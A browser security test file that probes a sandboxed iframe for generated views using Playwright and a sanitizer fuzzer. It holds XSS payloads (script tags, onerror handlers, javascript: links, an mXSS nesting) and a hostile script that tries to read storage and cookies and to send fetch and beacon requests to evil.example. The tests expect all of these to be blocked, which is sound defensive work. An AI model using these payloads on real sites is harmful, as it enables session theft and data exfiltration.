/**
 * Browser probes: a generated view's frame in real Chromium.
 *
 * Each probe loads a page that shows a GeneratedView and checks what a
 * hostile view can reach: the parent's DOM, storage, the network, navigation
 * and inline handlers. The first feeds hostile HTML through the real frame
 * runtime and sanitizer. The second swaps in a hostile runtime, as if a
 * sanitizer bypass had let script run, to show the CSP and sandbox stand
 * behind it. The third checks the bridge, and the last fuzzes the sanitizer
 * with Chromium's own parser. Run with `bun test browser`.
 */
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { build } from "esbuild";
import * as fc from "fast-check";
import { join } from "node:path";
import { type Browser, chromium, type Frame, type Page } from "playwright";

describe("generated-view browser probes", () => {
  const origin = "http://probe.test";
  let browser: Browser;
  let host: string;

  beforeAll(async () => {
    const result = await build({
      entryPoints: [join(import.meta.dir, "fixtures/host.tsx")],
      bundle: true,
      write: false,
      format: "iife",
      platform: "browser",
      target: "es2022",
      define: { "process.env.NODE_ENV": "\"production\"" },
      logLevel: "silent",
    });
    host = result.outputFiles[0]!.text;
    browser = await chromium.launch({ headless: true });
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
  });

  interface Opened {
    readonly page: Page;
    readonly frame: Frame;
    /** Every request the browser tried to send anywhere but the probe's own origin. */
    readonly leaks: Array<string>;
    readonly dialogs: Array<string>;
  }

  /** Opens the host page with a view, and waits for the frame's runtime to show it. */
  const open = async (probe: { html: string; interactions: Record<string, unknown>; runtime?: string; siblings?: boolean }, ready = "[data-smithers-view]"): Promise<Opened> => {
    const page = await browser.newPage();
    const leaks: Array<string> = [];
    const dialogs: Array<string> = [];
    page.on("dialog", (dialog) => {
      dialogs.push(dialog.message());
      void dialog.dismiss();
    });
    await page.route("**/*", async (route) => {
      const url = route.request().url();
      if (url === `${origin}/`) {
        await route.fulfill({
          contentType: "text/html",
          body: `<!doctype html><html><body><div id="marker">intact</div><div id="app"></div>` +
            `<script>localStorage.setItem("secret", "page"); document.cookie = "session=page";` +
            `window.probe = ${JSON.stringify(probe).replace(/</g, "\\u003c")}</script><script src="/host.js"></script></body></html>`,
        });
      } else if (url === `${origin}/host.js`) {
        await route.fulfill({ contentType: "text/javascript", body: host });
      } else {
        // Only a request the browser actually tries to send reaches a route: one the
        // frame's CSP stopped never does, so anything here would have left the page.
        if (!url.startsWith(origin)) leaks.push(url);
        await route.abort();
      }
    });
    await page.goto(`${origin}/`);
    const handle = await page.waitForSelector("iframe");
    const frame = (await handle.contentFrame())!;
    await frame.waitForSelector(ready, { state: "attached" });
    return { page, frame, leaks, dialogs };
  };

  /** What the parent page still holds, after the frame had its chance. */
  const parentState = (page: Page) =>
    page.evaluate(() => ({
      marker: document.getElementById("marker")?.textContent,
      url: location.href,
      secret: localStorage.getItem("secret"),
      cookie: document.cookie,
      frames: document.querySelectorAll("iframe").length,
    }));

  const hostile = [
    "<script>parent.document.getElementById('marker').textContent = 'script'; alert('script')</script>",
    "<img src=x onerror=\"parent.document.getElementById('marker').textContent = 'onerror'; alert('onerror')\">",
    "<svg onload=\"alert('svg')\"><circle r=\"4\" onclick=\"alert('circle')\"></circle></svg>",
    "<a href=\"javascript:alert('link')\" id=\"link\">link</a>",
    "<a href=\"https://evil.example/navigate\">go</a>",
    "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/refresh\">",
    "<base href=\"https://evil.example/\">",
    "<link rel=\"stylesheet\" href=\"https://evil.example/style.css\">",
    "<style>@import url(https://evil.example/import.css); body { background: url(https://evil.example/bg.png) }</style>",
    "<div style=\"background:url(https://evil.example/inline.png)\">styled</div>",
    "<form action=\"https://evil.example/submit\"><input name=\"q\" value=\"x\"><button>submit</button></form>",
    "<iframe src=\"https://evil.example/frame\"></iframe>",
    "<object data=\"https://evil.example/object\"></object><embed src=\"https://evil.example/embed\">",
    "<img srcset=\"https://evil.example/srcset.png 1x\" alt=\"set\">",
    "<input type=\"image\" src=\"https://evil.example/input.png\">",
    "<button onclick=\"alert('button')\" data-event=\"ask\">declared</button>",
    "<button data-event=\"sneak\">undeclared</button>",
    "<svg><a href=\"javascript:alert('svg link')\"><text y=\"10\">svg link</text></a><use href=\"https://evil.example/use.svg#a\"></use></svg>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert('mxss')></style></mglyph></table></mtext></math>",
  ].join("");

  describe("a hostile view, through the frame runtime and sanitizer", () => {
    test("reaches neither the parent page, its storage, the network, nor any navigation", async () => {
      const { dialogs, frame, leaks, page } = await open({ html: hostile, interactions: { ask: { kind: "message", label: "Ask" } } }, "button");
      // Click everything a person could: every element in the view, every button and link.
      for (const element of await frame.$$("[data-smithers-view] *")) await element.click({ force: true, timeout: 1_000 }).catch(() => undefined);
      await page.waitForTimeout(300);
      const kept = await frame.evaluate(() => ({
        elements: Array.from(document.querySelectorAll("[data-smithers-view] *"), (element) => element.localName),
        attributes: Array.from(document.querySelectorAll("[data-smithers-view] *")).flatMap((element) => Array.from(element.attributes, (attribute) => attribute.name)),
        url: location.href,
      }));
      expect(kept.elements).not.toContainAnyValues(["script", "a", "meta", "base", "link", "style", "iframe", "object", "embed", "use", "math", "mglyph"]);
      expect(kept.attributes.filter((name) => name.startsWith("on") || ["href", "src", "srcset", "action"].includes(name))).toEqual([]);
      expect(kept.url).toBe("about:srcdoc");
      expect(await parentState(page)).toEqual({ marker: "intact", url: `${origin}/`, secret: "page", cookie: "session=page", frames: 1 });
      expect(leaks).toEqual([]);
      expect(dialogs).toEqual([]);
      const log = await page.evaluate(() => window.log);
      expect(log.interactions).toEqual([{ _tag: "Message", event: { name: "ask" }, label: "Ask", values: {} }]);
      expect(log.refusals).toEqual(["undeclared"]);
      await page.close();
    }, 60_000);
  });

  /** A runtime that does what no view's HTML should be able to: runs, and tries everything. */
  const hostileRuntime = `(() => {
    const report = (name, value) => parent.postMessage(name + ":" + value, "*");
    const attempt = (name, act) => { try { act(); report(name, "ran"); } catch (error) { report(name, "blocked"); } };
    document.body.innerHTML = '<img src="x" onerror="parent.postMessage(\\'handler:ran\\', \\'*\\')"><div onclick="parent.postMessage(\\'click:ran\\', \\'*\\')" id="d">d</div><script>parent.postMessage("script:ran", "*")</script>';
    document.getElementById("d").click();
    attempt("parent-dom", () => parent.document.body.textContent);
    attempt("storage", () => localStorage.getItem("secret"));
    attempt("session", () => sessionStorage.length);
    attempt("cookie", () => { if (document.cookie.includes("session")) throw new Error("no"); document.cookie = "x=1"; if (!document.cookie.includes("x=1")) throw new Error("none"); });
    attempt("top-navigation", () => { top.location.href = "https://evil.example/top"; });
    attempt("popup", () => { if (window.open("https://evil.example/popup") === null) throw new Error("none"); });
    attempt("eval", () => eval("1"));
    fetch("https://evil.example/fetch").then(() => report("fetch", "ran"), () => report("fetch", "blocked"));
    const image = new Image(); image.onload = () => report("image", "ran"); image.onerror = () => report("image", "blocked"); image.src = "https://evil.example/image.png";
    // sendBeacon queues and returns true; the CSP stops the request itself, which the leak check sees.
    navigator.sendBeacon("https://evil.example/beacon", "x");
    try {
      const worker = new Worker("data:text/javascript,postMessage(1)");
      worker.onmessage = () => report("worker", "ran");
      worker.onerror = () => report("worker", "blocked");
    } catch (error) { report("worker", "blocked"); }
    document.body.insertAdjacentHTML("beforeend", '<form id="f" action="https://evil.example/form" method="post"><input name="q" value="x"></form>');
    attempt("form", () => document.getElementById("f").submit());
    setTimeout(() => report("done", "1"), 400);
  })();`;

  describe("a script that runs in the frame anyway", () => {
    test("is held by the CSP and the sandbox", async () => {
      const { dialogs, leaks, page } = await open({ html: "", interactions: {}, runtime: hostileRuntime }, "#d");
      await page.waitForFunction(() => window.log.messages.includes("done:1"), undefined, { timeout: 10_000 });
      await page.waitForTimeout(200);
      const messages = await page.evaluate(() => window.log.messages);
      const outcome = Object.fromEntries(messages.map((message) => message.split(":") as [string, string]));
      expect(outcome).toEqual({
        "parent-dom": "blocked",
        storage: "blocked",
        session: "blocked",
        cookie: "blocked",
        "top-navigation": "blocked",
        popup: "blocked",
        eval: "blocked",
        fetch: "blocked",
        image: "blocked",
        worker: "blocked",
        form: "ran",
        done: "1",
      });
      // `submit()` returns, but a sandbox without allow-forms never sends it.
      expect(leaks).toEqual([]);
      expect(dialogs).toEqual([]);
      expect(await parentState(page)).toEqual({ marker: "intact", url: `${origin}/`, secret: "page", cookie: "session=page", frames: 1 });
      await page.close();
    }, 60_000);
  });

  describe("the bridge in Chromium", () => {
    test("answers only its own frame: another frame's ui/initialize is refused", async () => {
      const { page } = await open({ html: "<p>view</p>", interactions: {} }, "p");
      await page.evaluate(() => {
        const intruder = document.createElement("iframe");
        intruder.setAttribute("sandbox", "allow-scripts");
        intruder.srcdoc = `<script>parent.postMessage({ jsonrpc: "2.0", id: 1, method: "ui/initialize", params: { nonce: "${"A".repeat(32)}" } }, "*")</script>`;
        document.body.appendChild(intruder);
      });
      await page.waitForFunction(() => window.log.refusals.length > 0);
      expect(await page.evaluate(() => window.log.refusals)).toEqual(["wrong_source"]);
      await page.close();
    }, 60_000);

    test("two mounted views initialize without false refusals", async () => {
      const { page } = await open({ html: '<button data-event="ask">Ask</button>', interactions: { ask: { kind: "message", label: "Ask" } }, siblings: true });
      const frames = page.frames().filter((frame) => frame !== page.mainFrame());
      expect(frames).toHaveLength(2);
      for (const frame of frames) await frame.click("button");
      await page.waitForFunction(() => window.log.interactions.length === 2);
      expect(await page.evaluate(() => window.log.refusals)).toEqual([]);
      await page.close();
    }, 60_000);

    test("submits only visible form controls", async () => {
      const { frame, page } = await open({
        html: `<form data-event="ask"><input name="visible" value="yes">
          <input type="hidden" name="hidden" value="no"><div hidden><input name="ancestor" value="no"></div>
          <input style="display:none" name="display" value="no"><input style="visibility:hidden" name="visibility" value="no">
          <div style="opacity:0"><textarea name="opacity">no</textarea></div>
          <details><input name="closed" value="no"></details>
          <button type="submit">Ask</button></form>`,
        interactions: { ask: { kind: "message", label: "Ask" } },
      }, "button");
      await frame.click("button");
      await page.waitForFunction(() => window.log.interactions.length === 1);
      expect(await page.evaluate(() => window.log.interactions)).toEqual([
        { _tag: "Message", event: { name: "ask" }, label: "Ask", values: { visible: "yes" } },
      ]);
      await page.close();
    }, 60_000);

    test("passes on a real click on a declared event with its form's values", async () => {
      const { frame, page } = await open({
        html: '<form><input name="url" value="https://github.com/maya/tinyhttp"><button data-event="clone">Clone</button></form><button data-event="cell:4">4</button>',
        interactions: { clone: { kind: "message", label: "Clone" }, cell: { kind: "state" } },
      }, "button");
      await frame.click("text=Clone");
      await frame.click("text=4");
      await frame.focus("input");
      await page.keyboard.press("Enter");
      // Enter in a field presses the form's default button, as Chromium's implicit submission does.
      await page.waitForFunction(() => window.log.interactions.length >= 3);
      const clone = { _tag: "Message", event: { name: "clone" }, label: "Clone", values: { url: "https://github.com/maya/tinyhttp" } };
      expect(await page.evaluate(() => window.log.interactions)).toEqual([clone, { _tag: "State", event: { name: "cell", arg: "4" } }, clone]);
      await page.close();
    }, 60_000);
  });

  describe("the sanitizer, fuzzed with Chromium's parser", () => {
    test("keeps nothing that runs, loads or navigates", async () => {
      const { page } = await open({ html: "", interactions: {} });
      const piece = fc.oneof(
        fc.constantFrom("x", "<!--", "-->", "</p>", "</svg>", "</math>", "</style>", "</noscript>", "<![CDATA[", "]]>", "\"", "'"),
        fc.tuple(
          fc.mixedCase(fc.constantFrom("svg", "math", "mtext", "mglyph", "style", "noscript", "template", "table", "select", "textarea", "title", "xmp", "iframe", "script", "a", "img", "form", "foreignObject", "annotation-xml", "desc", "p")),
          fc.mixedCase(fc.constantFrom("onerror", "onload", "href", "src", "xlink:href", "style", "id", "name", "encoding", "action")),
          fc.constantFrom("x", "javascript:alert(1)", "url(https://evil.example)", "text/html", "\"><img src=x onerror=alert(1)>", "data:image/png;base64,AA"),
        ).map(([tag, name, value]) => `<${tag} ${name}="${value}">`),
      );
      const samples = fc.sample(fc.array(piece, { minLength: 1, maxLength: 12 }).map((parts) => parts.join("")), { numRuns: 400, seed: 20261019 });
      const results = await page.evaluate((inputs) => inputs.map((input) => window.sanitizeHtml(input)), samples);
      for (const result of results) {
        expect(result.elements).not.toContainAnyValues(["script", "iframe", "a", "style", "noscript", "template", "math", "foreignobject", "form-action"]);
        for (const attribute of result.attributes) {
          const [element, rest] = [attribute.slice(0, attribute.indexOf(" ")), attribute.slice(attribute.indexOf(" ") + 1)];
          const name = rest.slice(0, rest.indexOf("=")).toLowerCase();
          const value = rest.slice(rest.indexOf("=") + 1);
          expect(name.startsWith("on") || ["href", "xlink:href", "action", "srcset"].includes(name)).toBe(false);
          if (name === "src") expect(element === "img" && value.startsWith("data:image/")).toBe(true);
          if (name === "style") expect(value).not.toMatch(/url\(/i);
        }
      }
      await page.close();
    }, 60_000);
  });
});
